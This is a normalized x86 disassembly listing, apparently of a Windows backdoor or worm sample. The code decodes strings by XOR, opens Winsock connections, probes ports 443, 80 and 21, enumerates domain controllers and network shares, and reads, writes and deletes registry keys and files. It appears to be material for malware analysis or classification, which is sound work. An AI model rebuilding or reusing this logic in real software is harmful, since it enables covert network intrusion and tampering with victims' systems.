je r-xdata
lea eax [ ebp - 0x48 ]
push rw-data
push eax
call strcpy
pop ecx
pop ecx
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
lea eax [ ebp - 0x48 ]
push rw-data
push eax
call esi
add esp 0xc
jmp r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x48 ]
push rw-data
push eax
call strcpy
pop ecx
pop ecx
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
mov edi [ GetProcAddress@IAT ]
push rw-data
push ebx
call edi
test eax eax
mov [ ebp - 0x8 ] eax
jne r-xdata
lea eax [ ebp - 0x48 ]
push eax
push rw-data
jmp r-xdata
push rw-data
push ebx
call edi
mov ebx eax
xor edi edi
cmp ebx edi
je r-xdata
lea eax [ ebp - 0x48 ]
push eax
push rw-data
jmp r-xdata
push [ ebp + 0xc ]
call esi
add esp 0xc
lea eax [ ebp - 0x48 ]
push eax
push rw-data
lea eax [ ebp - 0x248 ]
push 0x200
push eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call strlen
pop ecx
inc eax
push eax
push [ ebp + 0x8 ]
push edi
push edi
call [ MultiByteToWideChar@IAT ]
lea eax [ ebp - 0x248 ]
push eax
lea eax [ ebp - 0x448 ]
push rw-data
push eax
call [ swprintf@IAT ]
add esp 0xc
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x448 ]
push 0x65
push eax
call [ ebp - 0x8 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x48 ]
push eax
push rw-data
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
sub ecx 0x12c
je r-xdata
lea eax [ ebp - 0x48 ]
push eax
push rw-data
push 0x64
pop edx
sub ecx edx
je r-xdata
mov esi [ ebp + 0xc ]
push esi
call strlen
add eax esi
pop ecx
mov [ eax - 0x1 ] 0x53
mov [ eax ] 0x5d
and [ eax + 0x1 ] 0x0
test ah 0x80
je r-xdata
cmp [ eax + 0x8 ] 0x4
lea eax [ ebp - 0x48 ]
push eax
jne r-xdata
sub ecx edx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x4 ]
call ebx
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx 0x5
jne r-xdata
sub ecx edx
je r-xdata
push [ ebp + 0xc ]
call esi
add esp 0xc
push [ eax + 0xc ]
push ecx
jmp r-xdata
mov eax [ eax + 0xc ]
cmp eax edi
jne r-xdata
lea eax [ ebp - 0x48 ]
push eax
push rw-data
jmp r-xdata
lea eax [ ebp - 0x48 ]
sub ecx edx
push eax
je r-xdata
lea eax [ ebp - 0x48 ]
push eax
push rw-data
push [ ebp + 0xc ]
call esi
add esp 0x14
jmp r-xdata
cmp eax 0x1
jne r-xdata
lea eax [ ebp - 0x48 ]
push eax
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
test al 0x18
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x48 ]
push eax
push rw-data
jmp r-xdata
push eax
push 0x5
lea eax [ ebp - 0x48 ]
push eax
push rw-data
jmp r-xdata
sub_404d4d
push ebp
mov ebp esp
sub esp 0x354
push ebx
push esi
push edi
push 0x22
pop ecx
mov esi rw-data
lea edi [ ebp - 0xc4 ]
push 0x2a
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop ecx
mov esi rw-data
lea edi [ ebp - 0x170 ]
push 0x37
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop ecx
mov esi rw-data
lea edi [ ebp - 0x250 ]
xor eax eax
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
xor [ ebp + eax - 0xc4 ] 0x93
inc eax
cmp eax 0x89
jb r-xdata
xor eax eax
xor [ ebp + eax - 0x170 ] 0x93
inc eax
cmp eax 0xa8
jb r-xdata
xor eax eax
xor [ ebp + eax - 0x250 ] 0x93
inc eax
cmp eax 0xde
jb r-xdata
push [ ebp + 0x8 ]
call [ Ordinal_WSOCK32_52@IAT ]
test eax eax
je r-xdata
push rw-data
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
jmp r-xdata
push 0x0
push 0x1
pop edi
push edi
push 0x2
pop ebx
push ebx
call [ Ordinal_WSOCK32_23@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call strcpy
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x38 ]
push eax
call strcpy
cmp [ ebp - 0x38 ] 0x0
pop ecx
pop ecx
jne r-xdata
push 0x1bd
mov [ ebp - 0x18 ] bx
call [ Ordinal_WSOCK32_9@IAT ]
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x38 ]
push eax
call [ Ordinal_WSOCK32_10@IAT ]
mov [ ebp - 0x14 ] eax
push 0x8
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] edi
push eax
push 0x8004667e
push esi
call [ Ordinal_WSOCK32_12@IAT ]
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x18 ]
push 0x10
push eax
push esi
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x350 ] esi
mov [ ebp - 0x354 ] edi
call [ rw-data ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x354 ]
push 0x0
push eax
lea eax [ esi + 0x1 ]
push 0x0
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jg r-xdata
lea eax [ ebp - 0x38 ]
push eax
push rw-data
push [ ebp + 0xc ]
call [ sprintf@IAT ]
add esp 0xc
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push edi
lea eax [ ebp - 0x38 ]
push [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc4 ]
push 0x89
push eax
push esi
call sub_404f40
add esp 0x18
test eax eax
je r-xdata
lea eax [ ebp - 0x38 ]
push eax
push rw-data
push [ ebp + 0xc ]
call [ sprintf@IAT ]
add esp 0xc
jmp r-xdata
push ebx
lea eax [ ebp - 0x38 ]
push [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x170 ]
push 0xa8
push eax
push esi
call sub_404f40
add esp 0x18
test eax eax
je r-xdata
push esi
call [ Ordinal_WSOCK32_3@IAT ]
push 0x3
lea eax [ ebp - 0x38 ]
push [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x250 ]
push 0xde
push eax
push esi
call sub_404f40
add esp 0x18
sub_404f40
push ebp
mov ebp esp
mov eax 0x1120
call sub_407dc0
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx [ Ordinal_WSOCK32_12@IAT ]
push edi
push 0x1
pop edi
lea eax [ ebp - 0x4 ]
push eax
push 0x8004667e
push esi
mov [ ebp - 0x4 ] edi
call ebx
push 0x0
and [ ebp - 0x8 ] 0x0
push [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x2
mov [ ebp - 0x11c ] esi
mov [ ebp - 0x120 ] edi
push [ ebp + 0xc ]
push esi
call [ rw-data ]
lea ecx [ ebp - 0xc ]
lea eax [ esi + 0x1 ]
push ecx
lea ecx [ ebp - 0x120 ]
push 0x0
push ecx
push 0x0
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jg r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
push eax
push 0x8004667e
push esi
call ebx
lea eax [ ebp - 0xc ]
xor ebx ebx
push eax
push ebx
lea eax [ ebp - 0x120 ]
push ebx
push eax
lea eax [ esi + 0x1 ]
push eax
mov [ ebp - 0xc ] 0x4
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x11c ] esi
mov [ ebp - 0x120 ] edi
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jle r-xdata
push [ ebp + 0x14 ]
push rw-data
jmp r-xdata
push [ ebp + 0x14 ]
push rw-data
push ebx
lea eax [ ebp - 0x1120 ]
push 0x640
push eax
push esi
call [ Ordinal_WSOCK32_16@IAT ]
cmp eax 0xffffffff
jne r-xdata
push [ ebp + 0x18 ]
call [ sprintf@IAT ]
add esp 0xc
push esi
call [ Ordinal_WSOCK32_3@IAT ]
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x1c ] 0x3
jne r-xdata
mov eax edi
xor eax eax
lea ecx [ ebp - 0x10f0 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x1c ] dl
inc eax
inc ecx
inc ecx
cmp eax 0xc
jl r-xdata
and [ ebp + eax - 0x1c ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x14 ]
push rw-data
push [ ebp + 0x18 ]
call [ sprintf@IAT ]
add esp 0x10
sub_405082
push ebp
mov ebp esp
sub esp 0x254
push ebx
push esi
push rw-data
push [ ebp + 0x8 ]
call [ strstr@IAT ]
pop ecx
xor ebx ebx
test eax eax
pop ecx
jne r-xdata
push 0x44
lea eax [ ebp - 0x54 ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x24 ] bx
push eax
lea eax [ ebp - 0x54 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
push ebx
call [ CreateProcessA@IAT ]
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
lea eax [ ebp - 0x254 ]
push eax
call strcpy
mov esi [ strchr@IAT ]
lea eax [ ebp - 0x254 ]
push 0x22
push eax
call esi
add esp 0x10
cmp eax ebx
je r-xdata
inc eax
push 0x22
push eax
call esi
pop ecx
cmp eax ebx
pop ecx
je r-xdata
mov [ eax ] bl
lea eax [ ebp - 0x254 ]
push 0x5c
push eax
call [ strrchr@IAT ]
pop ecx
cmp eax ebx
pop ecx
je r-xdata
cmp [ eax - 0x1 ] 0x3a
jne r-xdata
mov [ eax ] bl
mov [ eax + 0x1 ] bl
jmp r-xdata
lea eax [ ebp - 0x253 ]
push eax
call [ rw-data ]
sub_40513d
push ecx
mov [ rw-data ] 0x4f
call sub_403edc
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
pop ecx
retn
lea ecx [ esp ]
push ecx
push eax
push eax
push sub_40788d
push eax
push eax
call [ CreateThread@IAT ]
sub_40516a
push ebp
mov ebp esp
sub esp 0x10
push 0x0
lea eax [ ebp - 0x10 ]
push 0x4
push eax
push [ ebp + 0x8 ]
call [ Ordinal_WSOCK32_16@IAT ]
cmp eax 0x4
je r-xdata
mov eax [ ebp - 0x10 ]
leave
retn
or eax 0xffffffff
leave
retn
sub_405190
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x5
pop edi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
lea ecx [ ebp - 0x4 ]
lea eax [ esi + 0x5 ]
push ecx
lea ecx [ edi - 0x5 ]
push eax
push ecx
push eax
mov [ esi + 0x1 ] edi
call sub_402974
push edi
push esi
call sub_4077bf
push esi
call [ free@IAT ]
add esp 0x1c
pop edi
pop esi
leave
retn
lea eax [ esi + 0x5 ]
mov [ esi ] 0x61
push eax
mov eax [ rw-data ]
lea ecx [ eax + 0x4 ]
push ecx
push [ eax ]
call sub_405309
lea edi [ eax + 0x5 ]
mov [ ebp - 0x4 ] eax
mov [ esi + edi ] 0x1
inc edi
lea eax [ esi + edi ]
push eax
mov eax [ rw-data ]
lea ecx [ eax + 0x4 ]
push ecx
push [ eax ]
call sub_40537b
add esp 0x18
mov [ ebp - 0x4 ] eax
add edi eax
sub_405213
mov eax [ rw-data ]
push esi
lea esi [ eax + 0x4 ]
push esi
call strlen
lea eax [ eax + esi + 0x1 ]
push eax
mov eax [ rw-data ]
push esi
push [ eax ]
call sub_4054f4
add esp 0x10
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_403edc
pop esi
retn
sub_40524b
mov eax [ rw-data ]
push esi
push edi
lea esi [ eax + 0x4 ]
push esi
call strlen
lea edi [ eax + esi + 0x1 ]
push edi
call strlen
push [ eax + edi + 0x5 ]
lea eax [ eax + edi + 0x1 ]
lea ecx [ eax + 0x8 ]
push ecx
push [ eax ]
mov eax [ rw-data ]
push edi
push esi
push [ eax ]
call sub_4054a5
add esp 0x20
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_403edc
pop edi
pop esi
retn
sub_405299
mov eax [ rw-data ]
push esi
lea esi [ eax + 0x4 ]
push esi
call strlen
lea eax [ eax + esi + 0x1 ]
push eax
mov eax [ rw-data ]
push esi
push [ eax ]
call sub_405407
add esp 0x10
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_403edc
pop esi
retn
sub_4052d1
mov eax [ rw-data ]
push esi
lea esi [ eax + 0x4 ]
push esi
call strlen
lea eax [ eax + esi + 0x1 ]
push eax
mov eax [ rw-data ]
push esi
push [ eax ]
call sub_405461
add esp 0x10
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_403edc
pop esi
retn
sub_405309
push ebp
mov ebp esp
push ecx
push ebx
lea eax [ ebp + 0xc ]
push esi
xor ebx ebx
push eax
push 0xf003f
push ebx
mov [ ebp - 0x4 ] ebx
push [ ebp + 0xc ]
xor esi esi
push [ ebp + 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push edi
xor eax eax
jmp r-xdata
push [ ebp + 0xc ]
call [ RegCloseKey@IAT ]
mov eax esi
pop edi
push edi
call strlen
inc [ ebp - 0x4 ]
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x10 ]
push ebx
push ebx
push ebx
lea edi [ esi + eax ]
lea eax [ ebp + 0x8 ]
push ebx
push eax
push edi
mov [ ebp + 0x8 ] 0x104
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
call [ RegEnumKeyExA@IAT ]
test eax eax
jne r-xdata
sub_40537b
push ebp
mov ebp esp
push ebx
lea eax [ ebp + 0x8 ]
push esi
xor esi esi
push eax
push 0xf003f
push esi
xor ebx ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push edi
mov edi [ ebp + 0x10 ]
xor eax eax
jmp r-xdata
push [ ebp + 0x8 ]
call [ RegCloseKey@IAT ]
mov eax esi
pop edi
mov eax [ ebp + 0xc ]
inc ebx
mov [ esi + edi + 0x104 ] eax
mov eax [ ebp + 0xc ]
lea esi [ esi + eax + 0x108 ]
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
lea eax [ ebp + 0xc ]
mov [ ebp + 0x10 ] 0x100
push eax
lea eax [ edi + esi + 0x108 ]
push eax
lea eax [ edi + esi + 0x100 ]
push eax
lea eax [ ebp + 0x10 ]
push 0x0
push eax
lea eax [ esi + edi ]
mov [ ebp + 0xc ] 0x2800
push eax
push ebx
push [ ebp + 0x8 ]
call [ RegEnumValueA@IAT ]
test eax eax
jne r-xdata
sub_405407
push ebp
mov ebp esp
sub esp 0x20
lea eax [ ebp + 0xc ]
push eax
push 0xf003f
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ SHDeleteKeyA@IAT ]
mov esi eax
lea eax [ ebp - 0x20 ]
push esi
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
push [ ebp + 0xc ]
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
leave
retn
xor eax eax
leave
retn
sub_405461
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push 0xf003f
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegDeleteValueA@IAT ]
push [ ebp + 0xc ]
mov esi eax
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
pop ebp
retn
xor eax eax
pop ebp
retn
sub_4054a5
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push 0xf003f
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegSetValueExA@IAT ]
push [ ebp + 0xc ]
mov esi eax
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
pop ebp
retn
xor eax eax
pop ebp
retn
sub_4054f4
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0xc ]
push edi
mov esi 0xf003f
push eax
xor edi edi
push esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push ebx
lea eax [ ebp + 0x8 ]
push edi
push eax
push edi
push esi
push edi
push edi
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegCreateKeyExA@IAT ]
push [ ebp + 0xc ]
mov esi [ RegCloseKey@IAT ]
mov ebx eax
call esi
push [ ebp + 0x8 ]
call esi
xor eax eax
cmp ebx edi
sete al
pop ebx
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_40554f
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x2
jne r-xdata
leave
retn
push ebx
lea eax [ ebp - 0x4 ]
xor ebx ebx
push eax
push ebx
push ebx
mov [ ebp - 0x4 ] ebx
call NetGetDCName
test eax eax
jne r-xdata
mov [ rw-data ] bl
push [ ebp - 0x4 ]
push rw-data
push rw-data
call [ sprintf@IAT ]
add esp 0xc
jmp r-xdata
push [ ebp - 0x4 ]
call NetApiBufferFree
cmp [ ebp - 0x4 ] ebx
pop ebx
je r-xdata
sub_40559f
sub esp 0x10c
lea eax [ esp ]
push ebx
push ebp
push esi
push edi
xor esi esi
push eax
push esi
push esi
push sub_405bd4
push esi
push esi
call [ CreateThread@IAT ]
push esi
lea eax [ esp + 0x1c ]
push 0x26
push eax
push esi
mov esi [ SHGetSpecialFolderPathA@IAT ]
call esi
mov edi [ sprintf@IAT ]
push rw-data
lea eax [ esp + 0x1c ]
push rw-data
push eax
mov ebx rw-data
lea eax [ esp + 0x24 ]
push ebx
push eax
call edi
mov ebp [ DeleteFileA@IAT ]
add esp 0x14
lea eax [ esp + 0x18 ]
push eax
call ebp
push 0x0
lea eax [ esp + 0x1c ]
push 0x26
push eax
push 0x0
call esi
push rw-data
lea eax [ esp + 0x1c ]
push rw-data
push eax
lea eax [ esp + 0x24 ]
push ebx
push eax
call edi
add esp 0x14
lea eax [ esp + 0x18 ]
push eax
call ebp
push 0x0
lea eax [ esp + 0x1c ]
push 0x26
push eax
push 0x0
call esi
push rw-data
lea eax [ esp + 0x1c ]
push rw-data
push eax
lea eax [ esp + 0x24 ]
push ebx
push eax
call edi
add esp 0x14
lea eax [ esp + 0x18 ]
push eax
call ebp
push 0x0
lea eax [ esp + 0x1c ]
push 0x26
push eax
push 0x0
call esi
push rw-data
push rw-data
lea eax [ esp + 0x20 ]
push eax
lea eax [ esp + 0x24 ]
push ebx
push eax
call edi
add esp 0x14
lea eax [ esp + 0x18 ]
push eax
call ebp
push 0x1
mov ebp 0x1d4c0
pop esi
mov ebx 0x2710
mov [ rw-data ] esi
push 0x32
mov [ rw-data ] edi
mov [ rw-data ] edi
call [ rw-data ]
call sub_4028eb
test eax eax
jne r-xdata
push eax
call [ Ordinal_WSOCK32_3@IAT ]
call sub_402696
test eax eax
jne r-xdata
call sub_40290d
call sub_402696
test eax eax
jne r-xdata
push ebp
call [ rw-data ]
jmp r-xdata
call sub_4073fc
test eax eax
jne r-xdata
push ebp
jmp r-xdata
mov [ rw-data ] esi
call sub_402709
test eax eax
je r-xdata
mov [ rw-data ] edi
jmp r-xdata
call [ rw-data ]
jmp r-xdata
push ebx
call sub_406f90
mov [ rw-data ] eax
call sub_407688
test eax eax
jne r-xdata
mov eax [ rw-data ]
xor edi edi
cmp eax edi
mov [ rw-data ] edi
mov [ rw-data ] edi
je r-xdata
lea eax [ esp + 0x14 ]
mov [ esp + 0x14 ] esi
push eax
push 0x8004667e
push [ rw-data ]
call [ Ordinal_WSOCK32_12@IAT ]
and [ rw-data ] 0x0
lea eax [ esp + 0x10 ]
push eax
push edi
push edi
push sub_402e6c
push edi
push edi
mov [ rw-data ] esi
call [ CreateThread@IAT ]
mov [ rw-data ] esi
cmp [ rw-data ] edi
je r-xdata
call sub_402a2f
push esi
call [ rw-data ]
jmp r-xdata
cmp [ rw-data ] edi
je r-xdata
sub_40579f
mov eax sub_407fd0
call _EH_prolog
sub esp 0x234
push ebx
push esi
push edi
xor esi esi
mov [ ebp - 0x10 ] esp
push rw-data
mov [ ebp - 0x4 ] esi
call [ rw-data ]
lea eax [ ebp - 0x20 ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x14 ]
push eax
movzx eax [ ebp - 0x16 ]
push eax
movzx eax [ ebp - 0x18 ]
push eax
movzx eax [ ebp - 0x1a ]
push eax
movzx eax [ ebp - 0x1e ]
push eax
movzx eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x240 ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x240 ]
push eax
call sub_405b97
add esp 0x24
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x38 ] 0x3
mov [ ebp - 0x30 ] esi
push 0x2
mov [ ebp - 0x2c ] esi
pop eax
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x24 ] esi
push eax
call sub_40585c
pop ecx
push rw-data
call sub_405b97
pop ecx
mov ecx [ ebp - 0xc ]
push 0x1
pop eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_40585c
push ebp
mov ebp esp
sub esp 0x294
push ebx
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov esi [ GetProcAddress@IAT ]
push rw-data
push edi
call esi
push rw-data
push edi
mov ebx eax
call esi
push edi
mov [ ebp - 0x10 ] eax
call [ FreeLibrary@IAT ]
xor edi edi
cmp ebx edi
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0xc ]
or [ ebp - 0x8 ] 0xffffffff
push eax
mov [ ebp - 0x4 ] 0x4000
push [ ebp + 0x8 ]
push edi
push edi
push 0x2
call ebx
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
push 0x40
call [ GlobalAlloc@IAT ]
mov ebx eax
cmp [ ebp - 0x14 ] 0x103
jne r-xdata
cmp [ ebp - 0x8 ] edi
mov [ ebp + 0x8 ] edi
jbe r-xdata
push [ ebp - 0x4 ]
push edi
push ebx
call memset
add esp 0xc
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
push [ ebp - 0xc ]
call [ ebp - 0x10 ]
cmp eax edi
mov [ ebp - 0x14 ] eax
jne r-xdata
push ebx
call [ GlobalFree@IAT ]
push [ ebp - 0xc ]
call WNetCloseEnum
neg eax
sbb eax eax
inc eax
lea esi [ ebx + 0x14 ]
mov eax [ esi - 0x8 ]
and eax 0x2
cmp al 0x2
jne r-xdata
cmp [ esi - 0x10 ] edi
jne r-xdata
inc [ ebp + 0x8 ]
add esi 0x20
mov eax [ ebp + 0x8 ]
cmp eax [ ebp - 0x8 ]
jb r-xdata
lea eax [ esi - 0x14 ]
push eax
call sub_40585c
pop ecx
cmp [ eax ] 0x5c
jne r-xdata
mov eax [ esi ]
cmp eax edi
je r-xdata
add eax 0x2
push eax
lea eax [ ebp - 0x94 ]
push eax
call strcpy
lea eax [ ebp - 0x94 ]
push eax
call sub_4059cf
add esp 0xc
cmp eax edi
je r-xdata
lea eax [ ebp - 0x94 ]
push eax
lea eax [ ebp - 0x294 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
push eax
lea eax [ ebp - 0x94 ]
push eax
lea eax [ ebp - 0x294 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0x10
jmp r-xdata
lea eax [ ebp - 0x294 ]
push eax
call sub_405b97
pop ecx
sub_4059cf
push ebp
mov ebp esp
sub esp 0x20
push [ ebp + 0x8 ]
call sub_402a10
test eax eax
pop ecx
jne r-xdata
push eax
lea eax [ ebp - 0x20 ]
push eax
call strcpy
lea eax [ ebp - 0x20 ]
push 0x1bb
push eax
call sub_405a36
add esp 0x10
test eax eax
je r-xdata
leave
retn
lea eax [ ebp - 0x20 ]
push 0x50
push eax
call sub_405a36
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax 0x1bb
leave
retn
lea eax [ ebp - 0x20 ]
push 0x15
push eax
call sub_405a36
neg eax
pop ecx
sbb eax eax
pop ecx
and eax 0x15
leave
retn
push 0x50
pop eax
leave
retn
sub_405a36
push ebp
mov ebp esp
sub esp 0x920
push ebx
push esi
push edi
push 0x0
push 0x1
pop edi
push edi
push 0x2
pop ebx
push ebx
call [ Ordinal_WSOCK32_23@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
push eax
push 0x8004667e
push esi
call [ Ordinal_WSOCK32_12@IAT ]
push [ ebp + 0x8 ]
call [ Ordinal_WSOCK32_10@IAT ]
push [ ebp + 0xc ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x1c ] bx
call [ Ordinal_WSOCK32_9@IAT ]
mov [ ebp - 0x1a ] ax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
push 0x8
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] ebx
xor ebx ebx
push 0x10
push eax
push esi
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x11c ] esi
mov [ ebp - 0x120 ] edi
call [ rw-data ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x120 ]
push ebx
push eax
lea eax [ esi + 0x1 ]
push ebx
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jg r-xdata
pop edi
pop esi
pop ebx
leave
retn
push rw-data
push rw-data
lea eax [ ebp - 0x51b ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x51b ]
push eax
call strlen
add eax 0x6
push 0xbb8
mov [ ebp - 0x51f ] eax
push eax
lea eax [ ebp - 0x520 ]
mov [ ebp - 0x520 ] 0x30
push eax
push esi
call sub_4027b3
add esp 0x24
test eax eax
jne r-xdata
xor edi edi
jmp r-xdata
lea eax [ ebp - 0x920 ]
push 0x5
push eax
push esi
call sub_403165
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push esi
call [ Ordinal_WSOCK32_3@IAT ]
mov eax edi
mov eax [ ebp - 0x91f ]
cmp eax 0x5
jl r-xdata
cmp eax 0x400
jae r-xdata
add eax 0xfffffffb
push eax
lea eax [ ebp - 0x91b ]
push eax
push esi
call sub_403165
lea eax [ ebp - 0x920 ]
push eax
call sub_405d46
add esp 0x10
sub_405b97
push esi
push rw-data
push rw-data
call [ fopen@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
pop esi
retn
push esi
push [ esp + 0xc ]
call strlen
pop ecx
push eax
push 0x1
push [ esp + 0x14 ]
call [ fwrite@IAT ]
push esi
call [ fclose@IAT ]
add esp 0x14
sub_405bd4
mov eax sub_407fdc
call _EH_prolog
sub esp 0x308
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x4 ] ebx
mov esi rw-data
push 0x3e8
call [ rw-data ]
jmp r-xdata
lea eax [ ebp - 0x114 ]
push ebx
push eax
push esi
call [ CopyFileA@IAT ]
lea eax [ ebp - 0x114 ]
push rw-data
push eax
call [ fopen@IAT ]
mov edi eax
pop ecx
cmp edi ebx
pop ecx
je r-xdata
inc eax
push rw-data
push eax
call strcpy
pop ecx
pop ecx
cmp [ rw-data ] ebx
jne r-xdata
push 0x493e0
call [ rw-data ]
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
lea eax [ ebp - 0x114 ]
push esi
push eax
call strcpy
lea eax [ ebp - 0x114 ]
push 0x5c
push eax
call [ strrchr@IAT ]
add esp 0x10
cmp eax ebx
je r-xdata
push edi
call [ fclose@IAT ]
pop ecx
lea eax [ ebp - 0x114 ]
push eax
call [ DeleteFileA@IAT ]
cmp [ rw-data ] ebx
je r-xdata
lea eax [ ebp - 0x214 ]
push eax
push rw-data
push edi
call [ fscanf@IAT ]
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push rw-data
call sub_405b97
pop ecx
lea eax [ ebp - 0x214 ]
push eax
call sub_4059cf
cmp eax ebx
pop ecx
je r-xdata
lea eax [ ebp - 0x214 ]
push eax
